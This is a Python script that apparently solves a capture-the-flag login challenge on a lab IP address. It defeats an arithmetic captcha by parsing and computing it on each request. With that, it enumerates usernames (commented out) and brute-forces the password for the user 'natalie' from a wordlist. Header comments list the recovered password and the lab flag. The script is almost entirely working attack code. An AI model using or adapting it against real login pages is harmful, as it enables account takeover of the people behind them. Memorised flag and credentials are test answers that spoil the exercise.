#!/usr/bin/env python3

# [+] User found: natalie
# [+] Password found for user natalie: sk8board
# FLAG: 7df2eabce36f02ca8ed7f237f77ea416

import requests
import re
import operator

HOST = 'http://10.10.145.27/login'

ops = {
    '+' : operator.add,
    '-' : operator.sub,
    '*' : operator.mul,
    '/' : operator.truediv,
    '%' : operator.mod,
    '^' : operator.xor,
}

r = requests.post(HOST, data={'username': 'test', 'password': 'test', 'captcha': '0000' })

# with open('usernames.txt') as users:
#     for user in users:
#         captcha = re.search(r'br>[\r\n]+(.*)', r.text).group(1).strip()
#         print(f'[+] Captcha: {captcha}')

#         num1 = re.search(r'(\d+)', captcha).group(1)
#         operator = re.search(r' (.) ', captcha).group(1)
#         num2 = re.search(r' (\d+)', captcha).group(1)
#         solution = ops[operator](int(num1), int(num2))
#         print(f'[+] Answer: {solution}')

#         data = { 'username': user.strip(), 'password': 'test', 'captcha': solution }
#         r = requests.post(HOST, data=data)

#         if ('does not exist' in r.text):
#             print(f'[-] User {user.strip()} does not exist')

#         elif ('Invalid captcha' in r.text):
#             print('[-] Invalid captcha')
#             break

#         else:
#             print(f'[+] User found: {user.strip()}')
#             break


with open('passwords.txt') as passwords:
    for password in passwords:
        captcha = re.search(r'br>[\r\n]+(.*)', r.text).group(1).strip()
        print(f'[+] Captcha: {captcha}')

        num1 = re.search(r'(\d+)', captcha).group(1)
        operator = re.search(r' (.) ', captcha).group(1)
        num2 = re.search(r' (\d+)', captcha).group(1)
        solution = ops[operator](int(num1), int(num2))
        print(f'[+] Answer: {solution}')

        data = { 'username': 'natalie', 'password': password.strip(), 'captcha': solution }
        r = requests.post(HOST, data=data)

        if ('Invalid password for user' in r.text):
            print(f'[-] Invalid password {password.strip()}')

        elif ('Invalid captcha' in r.text):
            print('[-] Invalid captcha')
            break

        else:
            print(f'[+] Password found for user natalie: {password.strip()}')
            break

